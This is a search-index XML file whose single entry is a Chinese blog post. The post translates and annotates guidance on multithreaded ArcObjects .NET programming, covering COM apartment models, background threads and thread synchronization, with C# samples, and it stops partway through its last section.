<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ArcObjects后台处理GP工具</title>
      <link href="//archives/1710925408957"/>
      <url>//archives/1710925408957</url>
      
        <content type="html"><![CDATA[<h2 id="ArcObjects后台处理GP工具"><a href="#ArcObjects后台处理GP工具" class="headerlink" title="ArcObjects后台处理GP工具"></a>ArcObjects后台处理GP工具</h2><p><a href="http://kikitamap.com/2014/06/25/BackgroundGeoprocessing/">后台地理处理（GP）</a><br><a href="https://www.cnblogs.com/songqingguo/p/12640096.html">使用队列+后台处理gp</a></p><h2 id="ArcObjects下的并发执行"><a href="#ArcObjects下的并发执行" class="headerlink" title="ArcObjects下的并发执行"></a>ArcObjects下的并发执行</h2><p><a href="https://www.cnblogs.com/jmllc/p/16003725.html">编写多线程 ArcObjects 代码</a><br>是官方文档翻译的？<br>copy</p><p>概述<br>多线程允许应用程序在单个进程中一次执行多个任务。 本主题详细介绍了多线程在 ArcObjects .NET SDK 环境中的含义，以及将线程正确集成到 ArcObjects 应用程序中所必须遵循的规则。</p><p>本主题不教授多线程概念。 相反，它为涉及多线程的日常 ArcObjects 编程问题提供了实用的解决方案。</p><p>关于多线程<br>多线程通常用于提高应用程序的响应能力。 这种响应能力可能是实际性能改进的结果，也可能是对性能改进的感知。 通过在代码中使用多个执行线程，您可以将【数据处理或输入/输出 (I/O) 操作】与【程序 UI 的管理】分开，防止任何长时间的数据处理操作降低 UI 的响应能力。</p><p>多线程的性能优势是以增加代码设计和维护的复杂性为代价的。 应用程序的线程共享相同的内存空间，因此您必须确保访问【共享的数据结构】是同步的，以防止应用程序进入无效状态甚至崩溃。 这种同步通常称为并发控制。</p><p>并发控制可以在两种层次上得到实现：对象层次和应用层次。</p><p>当共享对象是线程安全的时，它可以在对象级别实现。这意味着对象强制所有试图访问它的线程等待，直到当前访问对象的线程完成【对“对象的状态”的修改】。<br>并发控制可以在应用程序级别通过获取共享对象的独占锁来完成，允许一个线程一次修改对象的状态。 使用锁时要小心，因为过度使用它们会保护您的数据，但也会导致性能下降。 在性能和保护之间找到平衡需要仔细考虑您的数据结构和额外线程的预期使用模式。<br>使用多线程<br>构建多线程应用程序时，需要考虑两点：线程安全性和可伸缩性。 所有对象都是线程安全的，这很重要。但是仅仅拥有线程安全的对象，并不意味着创建多线程应用程序变得很简单，也不意味着【生成的应用程序】在性能上有所改进。</p><p>虽然您可以轻松地在 .NET Framework 的应用程序中生成线程； 但是，编写多线程 ArcObjects 代码时，仍应小心谨慎。 ArcObjects 的底层架构是 COM。 因此，在编写多线程 ArcObjects 应用程序时，需要了解 .NET 多线程和 COM 的线程模型。</p><p>使用多线程，并不会使你的代码运行得更快； 在许多情况下，它会增加额外的开销和复杂性，最终会降低代码的执行速度。 仅当增加的复杂性值得付出代价时，才应使用多线程。 一般来说，如果一个任务，可以分解成不同的独立任务，那么，它就适合使用多线程。</p><p>ArcObjects 线程模型<br>所有 ArcObjects 组件都被标记为 STA（single threaded apartment）。 每个 STA 被限制最多只关联一个线程（但每个进程的 STA 数量没有限制）。 当对方法的调用进入 STA 时，它会被转移到 STA 的线程（有且唯一的线程）上执行。 因此，STA 中的对象一次只能接收和处理一个方法调用，并且它接收到的每个方法调用，都在同一个线程中执行。</p><p>译者注释：</p><p>套间（apartment）是人为创建的、仅在逻辑上存在的一个概念，以建立和描述【线程与 COM 对象之间】的关系，用于简化 COM 对象在多线程方面上的实现。借助套间的概念，发明一套行之有效的机制；使用这个机制，避免了同步问题，简化了编程（然而，这套机制却很复杂）。</p><p>机制大致如下：</p><ol><li><p>一个进程有任意数量的 STA，最多一个 MTA；在 COM+ 机制下，还有名为 TNA 的套间，在同一进程内也最多一个TNA。</p></li><li><p>存在一个名为 SCM(服务控制管理器 ) 的 COM 运行时环境(可视为 COM 运行时)；<br>SCM 与 COM 对象、服务器（即被调用的 COM 对象）和操作系统交互，并提供客户端(COM 对象)和它们工作的对象之间的透明性。</p></li><li><p>线程必须属于某个套间，但是可以在不同时间内属于不同的套间。</p></li><li><p>每个 COM 对象都有一个名为 ThreadingModel 的特性（属性），它的值是Apartment、Free、Both和Neutral四个之一，用于指示这个 COM 对象的应该属于哪种类型的套间。</p><p>SCM 通过注册表中 COM 对象的 ThreadingModel 条目的值，决定将对象放置到哪种类型的套间中去。<br>一个对象在它的整个生命周期内，都只属于一个套间。COM 对象不会从一个套间迁移到另外一个套间。如果这个套间被释放，那么，这个对象也同时被释放。</p><p>如果在某个线程上创建一个 COM 对象，它有可能仅获取到这个 COM 对象的代理（Proxy），而不是 COM 对象的原始指针；因为 COM 对象与线程可能处理于不同的套间中。例如， COM 对象 ThreadingModel 的特性值是 Apartment，必须处于 STA 中，而恰好，调用它的线程处于 MTA 中。</p><p>编组（Marshalling）使客户端能够透明地对其他套间中的对象进行接口函数调用【由被调用 COM 对象所在套间的线程负责实际执行，而不是客户端所在套间的线程来执行这种调用，将参数编组过去，又将返回值编组回来】。编组可以发生在不同机器上的 COM 套间之间、不同进程空间中的 COM 套间之间，以及同一进程空间中的不同 COM 套间之间。</p><p>如果某个对象编写的时候忘记考虑多线程，或者没有时间考虑，或者没有必要提供实现多线程的支持，这个时候可以将对象指定为 STA，让 COM 机制自动管理对该对象的调用，以保证对象可以被正确调用。</p></li><li><p>线程调用自身所在套间的套间内 COM 对象时，不需要代理（Proxy），它是直接调用对象，和普通 C++ 的虚函数调用并无区别。<br>ArcObjects 组件都是线程安全的，您可以在多线程环境中使用它们。 在多线程环境中，为了使 ArcObjects 应用程序高效运行，必须考虑 ArcObjects 使用的单元线程模型（threading model）【即线程隔离模型】。 该模型通过消除跨线程通信来工作。 一个线程中的所有 ArcObjects 引用，应该只与同一线程中的对象通信。</p></li></ol><p>为了使该模型能正常工作，ArcGIS 中的单例对象被设计为每个线程的单例，而不是每个进程的单例。因为，在一个进程中托管多个单例的资源开销，被【不使用跨线程通信而产生的性能增益】所抵消。如果单例只在一个线程中创建，然后从其他线程访问，则会发生这种情况（即被上述所说的性能增益抵消掉，即可使用【不使用跨线程通信方式】，即是“单例对象被设计为每个线程的单例”的原因）。有关详细信息，请参阅 与单例对象的交互。</p><p>作为【可扩展 ArcGIS 系统】的开发人员，所有对象（包括您自己编写的对象）都必须遵守此规则——线程隔离模型——以确保程序正常工作。 如果您在开发过程中，创建单例对象，则必须确保这些对象是每个线程单例，而不是每个进程的单例。</p><p>为了在多线程环境中成功使用 ArcObjects，程序员在编写多线程代码时，必须遵循【线程隔离模型】，以避免应用程序失败，例如死锁情况、编组导致的负面性能，以及其他预期外的行为。</p><p>多线程场景<br>实现多线程应用程序，尽管有很多种方法，但以下内容会是您可能遇到的更常见的场景。</p><p>在 ArcObjects .NET SDK 中，有几个关于多线程编程示例。在以下代码示例中，我们会引用到它们。</p><p>这些示例，涵盖了本主题中描述的场景，展示了现实问题的解决方案，同时展示了最佳编程实践。 虽然这些示例使用多线程是作为【给定问题的解决方案的一部分】，但在某些示例中，您还会发现多线程只是在更广泛场景上的一面。</p><p>在后台线程上运行冗长的操作<br>当您有冗长的操作需要运行时，为了让应用程序可以同时自由处理其他任务，并且始终保持 UI 响应，可以将冗长的操作放在后台线程上运行。这是一种很方便的方式。 例如以下操作，遍历 FeatureCursor 以将信息加载到 DataTable 中，并【在将结果写入新 FeatureClass 时】执行复杂的拓扑操作。</p><p>当运行冗长操作时，请记住以下几点：</p><p>根据【线程隔离模型】，您不能在线程之间共享 ArcObjects 组件。 相反，利用单例对象是“每个线程的单例”的事实——在后台线程中，实例化所需的所有工厂类（工厂类一般是这样的单例），用于打开要素类、创建新要素类、设置空间参考等。【译注：意思是，需要在本线程中实例化单例对象，而不是使用其他线程中的相应对象】。<br>传递给线程的所有信息，必须采用简单类型（simple type）或托管类型（managed type）的形式（译注：不能是 ArcObjects COM 对象之类）。<br>在必须将 ArcObjects 组件从主线程传递到工作线程的情况下，将对象序列化为字符串，将字符串传递给目标线程，然后将对象反序列化（ 您可以使用 XmlSerializerClass 来序列化一个对象）。例如，将 workspace 连接属性（一个 [IPropertySet](https: //desktop.arcgis.com/en/arcobjects/latest/net/IPropertySet.htm))，转换成字符串； 将字符串传递给工作线程；在工作线程上，使用 XmlSerializerClass 反序列化，获取到连接属性。 这样，就在后台线程上创建连接属性对象了，避免了跨单元调用。<br>在运行后台线程时，您可以将任务进度报告到 UI 对话框中。 本主题的 从后台线程更新 UI 部分对此进行了更详细的介绍。<br>下面的代码示例，演示了一个后台线程，该线程用于遍历 FeatureCursor，并填充 DataTable（在稍后的应用程序中需要使用）。 这使应用程序可以自由运行，而无需等待填充表的完成。</p><p>[C#]</p><p>//生成线程<br>Thread t=new Thread(new ThreadStart(PopulateLocationsTableProc));<br>//将线程标记为 STA，以高效运行 ArcObjects<br>t.SetApartmentState(ApartmentState.STA);<br>//启动线程<br>t.Start();</p><p>/// <summary><br>/// 将 MajorCities 要素类中的信息加载到 locations 表中<br>/// </summary><br>private void PopulateLocationsTableProc()<br>{<br>    //从注册表中获取 ArcGIS 路径<br>    RegistryKey key=Registry.LocalMachine.OpenSubKey(@”SOFTWARE\ESRI\ArcGIS”);<br>    string path=Convert.ToString(key.GetValue(“InstallDir”));</p><pre><code>//打开要素类。 Workspace Factory 必须被实例化，因为它是每个线程的单例。IWorkspaceFactory wf=new ShapefileWorkspaceFactoryClass()as IWorkspaceFactory;IWorkspace ws=wf.OpenFromFile(System.IO.Path.Combine(path, @    &quot;DeveloperKit10.0\Samples\Data\USZipCodeData&quot;), 0);IFeatureWorkspace fw=ws as IFeatureWorkspace;IFeatureClass featureClass=fw.OpenFeatureClass(m_sShapefileName);//映射&quot;NAME&quot;和&quot;ZIP&quot;字段。int nameIndex=featureClass.FindField(&quot;NAME&quot;);//名称int zipIndex=featureClass.FindField(&quot;ZIP&quot;);//邮政编码string cityName;long zip;try&#123;    //遍历 features 并将信息添加到表中。    IFeatureCursor fCursor=null;    fCursor=featureClass.Search(null, true);    IFeature feature=fCursor.NextFeature();    int index=0;    while (null != feature)    &#123;        object obj=feature.get_Value(nameIndex);        if (obj == null)            continue;        cityName=Convert.ToString(obj);        obj=feature.get_Value(zipIndex);        if (obj == null)            continue;        zip=long.Parse(Convert.ToString(obj));        if (zip &lt;= 0)            continue;        //将当前获取到的城市名称和邮政编码，添加到 m_locations 表中。        //m_locations 是一个包含了城市名称和邮政编码的数据表。        DataRow r=m_locations.Rows.Find(zip);        if (null == r)        &#123;            r=m_locations.NewRow();            r[1]=zip;            r[2]=cityName;            lock(m_locations)            &#123;                m_locations.Rows.Add(r);            &#125;        &#125;        feature=fCursor.NextFeature();        index++;    &#125;    //释放 fCursor    Marshal.ReleaseComObject(fCursor);&#125;catch (Exception ex)&#123;    System.Diagnostics.Trace.WriteLine(ex.Message);&#125;</code></pre><p>}<br>实现独立的 ArcObjects 应用程序<br>如 MSDN 网站上【Thread.ApartmentState 属性】 页面所述，“在 .NET Framework 2.0 版中，如果新线程在启动前尚未设置其套间状态（apartment state），则将其初始化为 ApartmentState.MTA。应用程序的主线程默认初始化为 ApartmentState.MTA。以前，将应用程序主线程设置为 ApartmentState.STA，是通过在第一行代码上设置 System.Threading.ApartmentState 属性来进行的，现在，改用 STAThreadAttribute。</p><p>作为 ArcObjects 开发人员，这意味着，如果您的应用程序未初始化为 STA 应用程序，.NET Framework 将为所有 ArcObjects 创建一个特殊的 STA 线程（因为 ArcObjects 被标记为 STA）。这将导致在每次从应用程序调用 ArcObjects 时，从主线程切换到该线程；反过来，这会强制 ArcObjects 组件编组每个调用；最终调用 COM 组件的速度可能会慢上 50 倍。</p><p>幸运的是，这可以通过简单的方式来避免，将 main 函数标记为 [STAThread] 。</p><p>以下代码示例，将控制台应用程序标记为 STA：</p><p>[C#]</p><p>namespace ConsoleApplication1<br>{<br>    class Program<br>    {<br>        [STAThread]<br>        static void Main(string[] args)<br>        {<br>            // …<br>        }<br>    }<br>}<br>如果您使用【项目向导】创建 Windows 应用程序，它会自动将 [STAThread] 放在 main 函数上。</p><p>使用托管 ThreadPool 和 BackGroundWorker 线程<br>【线程池线程】都是后台线程（译注：此处指由静态类 System.Threading.ThreadPool 负责管理的线程）。线程池通过为您的应用程序提供由系统管理的工作线程，使您能够更有效地使用线程。与为每个任务创建新线程相比，使用线程池的优势在于消除了线程创建和销毁开销，这可以带来更好的性能和更好的系统稳定性。</p><p>但是，根据设计，所有【线程池线程】都在 MTA 中，因此，不适用于运行 ArcObjects（ArcObjects 被标记为 STA）【泽注：即 System.Threading.ThreadPool 类”不可用“】。</p><p>要解决此问题，您有几个选择：</p><p>实现一个标记为 STAThread 的 ArcObjects 专用线程，并将来自 MTA 线程的每个调用，都委托给这个 ArcObjects 专用线程。<br>使用自定义 STA 线程池，例如，标记为 STAThread 的线程数组来运行 ArcObjects。<br>以下代码示例，演示了使用 STAThread 线程数组对 RasterDataset 进行子集化（使用不同的线程对每个栅格波段进行子集化）：</p><p>[C#]</p><p>/// <summary><br>/// 用于将任务信息传递给工作线程的类<br>/// </summary><br>public class TaskInfo<br>{<br>    …<br>    public TaskInfo(int BandID, ManualResetEvent doneEvent)<br>    {<br>        m_bandID=BandID;<br>        m_doneEvent=doneEvent;<br>    }<br>    …<br>}</p><p>…<br>public override void OnMouseDown(int Button, int Shift, int X, int Y)<br>{<br>    …<br>    // 运行子集化线程，该线程将分离出多个单独的子集化任务。<br>    // 默认情况下，此线程将作为 MTA 运行。这因为它使用了 WaitHandle.WaitAll() 。<br>    // 这个方法必须在 MTA 中调用。<br>    Thread t=new Thread(new ThreadStart(SubsetProc));<br>    t.Start();</p><pre><code>//译注：也可以是以下方法开启，Task默认为 MTA //System.Threading.Tasks.Task.Run(()=&gt; SubsetProc());</code></pre><p>}</p><p>/// <summary><br>/// 进行子集化，为栅格的每个波段创建一个专用线程<br>/// </summary><br>private void SubsetProc()<br>{<br>    …<br>    //创建线程数组。<br>    Thread[] threadTask=new Thread[m_intBandCount];</p><pre><code>//每个子线程将 子集化 一个不同的栅格波段。//子集化栅格波段所需的所有信息，将由用户定义的 TaskInfo 类传递给任务。for (int i=0; i &lt; m_intBandCount; i++)&#123;    TaskInfo ti=new TaskInfo(i, doneEvents[i]);    ...     //为栅格波段 分配 子集化线程，注意运行 ArcObjects 所需的 STA    threadTask[i]=new Thread(new ParameterizedThreadStart(SubsetRasterBand));    threadTask[i].SetApartmentState(ApartmentState.STA);    threadTask[i].Name=&quot;Subset_&quot; + (i + 1).ToString();    //启动任务并传递任务信息    threadTask[i].Start((object)ti);&#125;... //等待所有线程完成它们的任务...WaitHandle.WaitAll(doneEvents);...</code></pre><p>}</p><p>/// <summary><br>/// 子集化，需运行 ArcObjects<br>/// </summary><br>/// <param name="state"></param><br>private void SubsetRasterBand(object state)<br>{<br>    //必须将状态对象转换为正确的类型，<br>    //因为 WaitForTimerCallback 委托的签名指定了 Object 类型。<br>    TaskInfo ti=(TaskInfo)state;</p><pre><code>//反序列化 workspace 的连接属性IXMLSerializer xmlSerializer=new XMLSerializerClass();object obj=xmlSerializer.LoadFromString(ti.InputRasterWSConnectionProps, null, null);IPropertySet workspaceProperties=(IPropertySet)obj;...</code></pre><p>}<br>【泽注，此代码示例，开启了三个层级的线程：运行 OnMouseDown 的最初线程（主线程），1个；运行 SubsetProc 的副线程，1个；运行 SubsetRasterBand 的任务线程，多个（即 m_intBandCount 个）】</p><p>同步执行并发运行的线程<br>在许多情况下，您必须同步正在并发运行的线程。 通常，您必须等待一个或多个线程完成其任务；或在满足特定条件时，向等待中的线程发出信号，以恢复其运行；或测试给定线程是否处于活动、运行的状态；或更改线程优先级；或给出其他一些指示。</p><p>在 .NET 中，有几种方法用来管理线程的执行。 用于线程管理的主要类， 有如下这些类：</p><p>System.Threading.Thread - 用于创建和控制线程，更改线程优先级，以及获取线程状态。</p><p>System.Threading.WaitHandle - 定义一种信号机制，允许您限制对代码块的访问。WaitHandle.WaitAll() 方法 与 WaitHandle.WaitAny() 将阻止当前线程，直到收到信息。常与 System.Threading.ManualResetEvent 搭配着一起实现 同步功能。</p><p>只有被标记为 MTA 的线程，才可以调用 WaitHandle.WaitAll() 方法。</p><p>要想同步多个任务，您首先必须运行一个工作线程（即 MTA 线程），该工作线程又将运行多个子线程（即 STA 线程）。</p><p>System.Threading.AutoResetEvent and System.Threading.ManualResetEvent - 用于通知等待线程有事件发生，允许线程通过信号相互通信。</p><p>System.Threading.Monitor - 相似于 System.Threading.WaitHandle 类，提供了一种同步访问对象的机制。Monitor.Enter(object) 锁定一个对象，表示仅当前线程可以访问它，其他如果访问它的话，则需要等待； Monitor.Exit(object) 释放被锁定的对象，其他线程方可得到访问它的权限。</p><p>以下代码示例，扩展了上一节的示例：</p><p>它演示了使用 WaitHandle 类来等待多个子线程完成它们的任务（通过 ManualResetEvent 来实现）。</p><p>它还演示了使用 AutoResetEvent 类来阻止正在运行的子线程，阻止子线程【访问共享资源的代码块】【AutoResetEvent .WaitOne() 方法可以停止当前线程】。</p><p>主线程（父线程）发出信号，其中一子线程得以继续执行。</p><p>在当前子线程完成其任务时发出信号，以让下一个被阻止的子线程得以继续执行。</p><p>[C#]</p><p>/// <summary><br>/// 主线程传递给子线程的信息。<br>/// </summary><br>public class TaskInfo<br>{<br>    //用来通知主线程，子线程任务已完成<br>    private ManualResetEvent m_done Event;</p><pre><code>... public TaskInfo(int BandID, ManualResetEvent doneEvent)&#123;    m_bandID=BandID;    m_doneEvent=doneEvent;&#125;... public ManualResetEvent DoneEvent&#123;    get    &#123;        return m_doneEvent;    &#125;    set    &#123;        m_doneEvent=value;    &#125;&#125;</code></pre><p>}</p><p>//用于阻止对共享资源的访问（即栅格数据集），注意：m_autoEvent 是静态的<br>private static AutoResetEvent m_autoEvent=new AutoResetEvent(false);</p><p>…<br>public override void OnMouseDown(int Button, int Shift, int X, int Y)<br>{<br>    …<br>    // 运行子集化线程，该线程将分离出多个单独的子集化任务。<br>    // 默认情况下，此线程将作为 MTA 运行。这因为它使用了 WaitHandle.WaitAll() 。<br>    // 这个方法必须在 MTA 中调用。<br>}</p><p>/// <summary><br>/// Main subset method.<br>/// </summary><br>private void SubsetProc()<br>{<br>    …<br>    //创建 ManualResetEvent 以通知主线程所有 线程池中的子线程都已完成其任务。<br>    ManualResetEvent[] doneEvents=new ManualResetEvent[m_intBandCount];</p><pre><code>//为栅格的每个波段，创建一个子线程（在线程池中）。每个子线程将子集化一个不同的栅格波段。 //对栅格波段进行子集化所需的所有信息都将由用户自定义的 TaskInfo 类传递给 子线程。for (int i=0; i &lt; m_intBandCount; i++)&#123;    //创建 ManualResetEvent，用于向【等待线程（父线程）】发出任务已完成的信号。    doneEvents[i]=new ManualResetEvent(false);    TaskInfo ti=new TaskInfo(i, doneEvents[i]);    ...    //为栅格波段 分配 子集化线程，注意运行 ArcObjects 所需的 STA    threadTask[i]=new Thread(new ParameterizedThreadStart(SubsetRasterBand));    threadTask[i].SetApartmentState(ApartmentState.STA);    threadTask[i].Name=&quot;Subset_&quot; + (i + 1).ToString();    //启动任务并传递任务信息    threadTask[i].Start((object)ti);&#125;//允许等待线程继续进行//让子线程可以访问共享资源(即栅格数据集）m_autoEvent.Set();// 等待所有线程完成它们的任务...WaitHandle.WaitAll(doneEvents);...</code></pre><p>}</p><p>/// <summary><br>/// 子集化，需运行 ArcObjects<br>/// </summary><br>/// <param name="state"></param><br>private void SubsetRasterBand(object state)<br>{<br>    //对象 state 转换为正确的类型<br>    TaskInfo ti=(TaskInfo)state;<br>    … </p><pre><code>//阻止当前子线程，直到 m_autoEvent 收到信号。//即在多个子线程中，只有一个子线程，可以获得到独占式访问的权限。//第一个信号由主线程发出，即父线程发出信号，其中一个子线程收到信号，从而获得到权限;//而其他子线程需要继续等待。m_autoEvent.WaitOne();//在此处插入代码，运行您的业务逻辑。//此处代码，包含对共享资源的访问。//通知【下一个可用子线程】，以让其获取写访问权限。m_autoEvent.Set();//通知主线程，当前子线程已完成其任务。ti.DoneEvent.Set();</code></pre><p>}<br>在多个线程间共享托管类型<br>有时，您的 .NET 应用程序的底层数据结构是诸如 DataTable 或 HashTable 这样的托管对象。这些 .NET 托管对象事实上是允许您在多个线程之间共享它们的（例如数据获取线程和主呈现线程）。但是，不管如何，您都应该查阅 MSDN 网站，以验证托管对象是否是线程安全的。一般来说，对于读取，托管对象是线程安全的，但对于写入，却不一定是。另外，有一些集合类，它们实现了同步的方法，因为该方法提供了一个围绕底层集合的同步包装器。</p><p>如果您创建的对象可以被多个线程访问，您应该根据 MSDN 中有关此特定对象的线程安全部分，获取【访问这个对象的】排他锁。可以使用上一节中描述的同步方法，或使用 lock 语句【lock 语句通过获取给定对象的互斥锁，将”代码块“标记为临界区。它确保当前线程被阻塞，直到”给定对象“被其他线程释放（退出锁），或当前线程是第一个访问给定对象的线程】。</p><p>The following screen shot demonstrates sharing a DataTable by multiple threads. First, check the DataTable Class on the MSDN Web site to verify if it is thread safe.</p><p>以下屏幕截图，演示了多个线程共享 DataTable。</p><p>首先，在 MSDN 网站上，检查 DataTable Class 是否是线程安全的。</p><p>Screen shot of MSDN DataTable Class.</p><p>页面显示：“这种类型对于多线程读取操作是安全的。您必须同步任何写入操作。”</p><p>这意味着从 DataTable 中读取信息不是问题，但是当您要写入时，您必须同步线程，阻止其他线程访问。 以下代码示例，显示了如何阻止其他线程：</p><p>[C#]</p><p>private DataTable m_locations=null;<br>… </p><p>DataRow rec=m_locations.NewRow();<br>rec[“ZIPCODE”]=zipCode; //邮政编码<br>rec[“CITYNAME”]=cityName; //城市名称</p><p>//锁定表并添加新记录<br>lock(m_locations)<br>{<br>    m_locations.Rows.Add(rec);<br>}<br>从后台线程更新 UI<br>在使用“后台线程” 执行冗长操作的时候，您往往希望向用户报告与【后台线程执行的任务】相关的进度、状态、错误或其他信息。 这可以通过更新 UI 上的控件来完成。 但是，在 Windows 中，UI 控件通常都是绑定到特定线程上的，并且不是线程安全的。</p><p>因此，您必须将任何【对 UI 控件的调用】委托给（封送给）“控件所属的线程”。</p><p>泽注：即“对控件的更新操作”都交由“控件所属的线程”来执行。例如，“控件所属的线程”可能正在重绘控件外观，而“后台线程”此时改变控件外观，就会造成画面混乱。如果发生这样的情况，就会触发异常，异常信息大致是“不能从不是创建该控件的线程调用它”。<br>“后台线程” 通过调用控件的 Invoke 方法，使”控件所属的线程“执行【委托所关联的方法】。而在此之前，“后台线程” 通过控件的 InvokeRequired 属性，判断是否必须调用 invoke 方法。</p><p>下面的代码示例，演示了如何将“后台任务的进度”报告到用户界面中去。</p><p>[C#]</p><p>public class WeatherItemSelectionDlg : System.Windows.Forms.Form<br>{<br>    //1.声明一个委托。通过该委托，您可以将信息传递给控件：<br>    private delegate void AddListItmCallback(string item);<br>    //…</p><pre><code>//对控件进行线程安全的调用：//2.设置更新 UI 控件的方法。注意对 Invoke 的调用。//  该方法必须与之前声明的委托具有相同的签名。private void AddListItemString(string item)&#123;    // InvokeRequired 将比较【调用线程的 ID】与【创建线程的 ID】，    // 以判断二者是否同属一个线程中。    // 如果这些线程不同，则返回 true。    if (this.lstWeatherItemNames.InvokeRequired)    &#123;        //让主线程执行自己        AddListItmCallback d = new AddListItmCallback(AddListItemString);        this.Invoke(d, new object[] &#123; item &#125;);                  //译注：此处将 item 作为参数，传递给委托 d 封装的方法。         //如下两个函数签名，是.NET 上关于 Invoke 方法的两个重载。        //public object Invoke(Delegate method);        //public object Invoke(Delegate method, params object[] args);    &#125;    else    &#123;        //保证在主 UI 线程上运行：        this.lstWeatherItemNames.Items.Add(item);    &#125;&#125;//3.后台线程执行冗长操作，并发起对 UI 控件的更新//在本例中，后台线程将执行 AddListItemString 方法中 控件 InvokeRequired 属性为 true 的部分；//然后，主线程将执行 InvokeRequired 属性为 false 的部分。private void PopulateSubListProc()&#123;    //在此处插入代码，运行您的业务逻辑。        //更新 UI 控件。传递所需的数据，在本例中为字符串 item    frm.AddListItemString(item);&#125;//...//4.生成后台线程，传入步骤 3 中编写的方法，并启动：private void GenerateThread()&#123;    Thread t = new Thread(new ThreadStart(PopulateSubListProc));    t.Start();&#125;</code></pre><p>}<br>从主线程以外的线程调用 ArcObjects<br>在许多“多线程应用程序”中，您需要从不同的线程调用（另一个线程的） ArcObjects。 例如，您可能有一个【从 Web 服务获取 response 的】后台线程，该线程“向地图添加新项目的显示”、更改地图范围，或运行 GP 工具以执行某种分析。</p><p>另一个非常常见的例子，从计时器（System.Timers.Timer）事件处理程序方法中调用 ArcObjects。 在 ThreadPool 任务上（不是主线程的线程），引发计时器的 Elapsed 事件（达到间隔时发生）。 然而它需要使用 ArcObjects，这似乎需要跨 apartment 调用。但是，通过将 ArcObjects 组件视为 UI 控件，并使用 Invoke 方法，将调用委托给【创建 ArcObjects 组件的主线程】，可以避免这种情况的发生（跨 apartment 调用）。因此，不会进行出现跨 apartment 调用 ArcObjects。</p><p>ISynchronizeInvoke（System.ComponentModel.ISynchronizeInvoke）接口包括 Invoke、BeginInvoke 和 EndInvoke 方法，实施这些方法可能是一项艰巨的任务。相反，让您的类直接继承 System.Windows.Forms.Control ，或拥有一个继承自 Control 的辅助类，会是一个轻松的办法。 后述的任一选项，都为调用方法提供了简单而有效的解决方案。</p><p>泽注：ISynchronizeInvoke 接口，属于.Net 旧版本中广泛使用的异步编程模型 APM 的一部分。</p><p>C#的三种异步的详细介绍及实现:</p><ul><li>异步编程模型 (APM，Asynchronous Programming Model) ；</li><li>基于事件的异步模式 (EAP，Event-based Asynchronous Pattern)</li><li>基于任务的异步模式 (TAP， Task-based Asynchronous Pattern)<br>译注：详情可以参阅： C#的三种异步的详细介绍及实现 。此处可以讨论，是否可以使用更新的技术（比如，async/await）来实现相同的功能？该功能能够做到，既不使用 ISynchronizeInvoke 接口，也不使用控件，还能使代码简洁、实现起来方便、易读懂。</li></ul><p>以下代码示例，使用用户自定义的 InvokeHelper 类（继承自 Control 的辅助类），来调用计时器的 Elapsed 事件处理程序，以重新居中地图的可见边界，并设置地图的旋转。</p><p>除了传递【带信息的结构体】之外，某些应用程序逻辑，也必须在 InvokeHelper 类上完成。<br>[C#]</p><p> /// <summary><br>/// 一个辅助类，让主线程执行委托的方法<br>/// </summary><br>public sealed class InvokeHelper : Control<br>{<br>    //声明一个委托，用于将方法传递给主线程。<br>    public delegate void MessageHandler(NavigationData navigationData);</p><pre><code>//私有成员private IActiveView m_activeView;private IPoint m_point = null;/// &lt;summary&gt;/// 一个传入 ActiveView 的构造函数/// &lt;/summary&gt;public InvokeHelper(IActiveView activeView)&#123;    //确保控件已创建，并且具有有效的句柄。    this.CreateHandle();    this.CreateControl();    m_activeView = activeView;&#125;/// &lt;summary&gt;/// 将 CenterMap 方法交给主线程执行。/// &lt;/summary&gt;public void InvokeMethod(NavigationData navigationData)&#123;    if (!this.IsDisposed &amp;&amp; this.IsHandleCreated)    &#123;        //译注：此处 被调用的 Invoke 方法来自基类 Control        Invoke(new MessageHandler(CenterMap), new object[] &#123; navigationData &#125;);    &#125;&#125;/// &lt;summary&gt;/// 通过委托而被执行的方法。译注：与声明委托时，函数签名一致。该方法在主线程上执行。/// &lt;/summary&gt;public void CenterMap(NavigationData navigationData)&#123;    //获取当前地图可见范围。    IEnvelope envelope =        m_activeView.ScreenDisplay.DisplayTransformation.VisibleBounds;    if (null == m_point)    &#123;        m_point = new PointClass();    &#125;    //设置新的地图中心坐标。    m_point.PutCoords(navigationData.X, navigationData.Y);    //围绕新坐标将地图居中。    envelope.CenterAt(m_point);    m_activeView.ScreenDisplay.DisplayTransformation.VisibleBounds = envelope;    //将地图旋转到新的旋转角度。    m_activeView.ScreenDisplay.DisplayTransformation.Rotation =        navigationData.Azimuth;//Azimuth 方位角&#125;/// &lt;summary&gt;/// 控制初始化。/// &lt;/summary&gt;private void InitializeComponent() &#123; &#125;</code></pre><p>}</p><p>/// <summary><br>/// 被传递的信息(结构体)<br>/// </summary><br>public struct NavigationData<br>{<br>    public double X;<br>    public double Y;<br>    public double Azimuth;//方位角</p><pre><code>/// &lt;summary&gt;/// 构造器/// &lt;/summary&gt;public NavigationData(double x, double y, double azimuth)&#123;    X = x;    Y = y;    Azimuth = azimuth;&#125;</code></pre><p>}</p><p>/// <summary><br>/// 此命令触发跟踪功能<br>/// 点击之后，<br>/// </summary><br>public sealed class TrackObject : BaseCommand<br>{<br>    //Class members.<br>    private IHookHelper m_hookHelper = null;<br>    //…<br>    private InvokeHelper m_invokeHelper = null;<br>    private System.Timers.Timer m_timer = null;</p><pre><code>//... /// &lt;summary&gt;/// 在创建此命令时发生。/// &lt;/summary&gt;/// &lt;param name=&quot;hook&quot;&gt;一个应用程序的实例&lt;/param&gt;public override void OnCreate(object hook)&#123;    //...     //实例化计时器。    m_timer = new System.Timers.Timer(60);    m_timer.Enabled = false;    //设置计时器的 Elapsed 事件的处理程序。    m_timer.Elapsed += new ElapsedEventHandler(OnTimerElapsed);&#125;/// &lt;summary&gt;/// 单击此命令时发生。/// &lt;/summary&gt;public override void OnClick()&#123;    //创建 InvokeHelper 类。    if (null == m_invokeHelper)    &#123;        m_invokeHelper = new InvokeHelper(m_hookHelper.ActiveView);    &#125;    //...     //启动计时器。    if (!m_bIsRunning)        m_timer.Enabled = true;    else        m_timer.Enabled = false;    //...&#125;/// &lt;summary&gt;/// 计时器的 Elapsed 事件的处理程序。/// &lt;/summary&gt;private void OnTimerElapsed(object sender, ElapsedEventArgs e)&#123;    //...     //创建 NavigationData 。    NavigationData navigationData = new NavigationData(currentPoint.X,         currentPoint.Y, azimuth);    //更新地图范围和旋转。    m_invokeHelper.InvokeMethod(navigationData);    //...&#125;</code></pre><p>}<br>译注：</p><p>使用继承自 Control 的辅助类，本质是：作为 STA 线程的调用方，使用“从后台线程更新 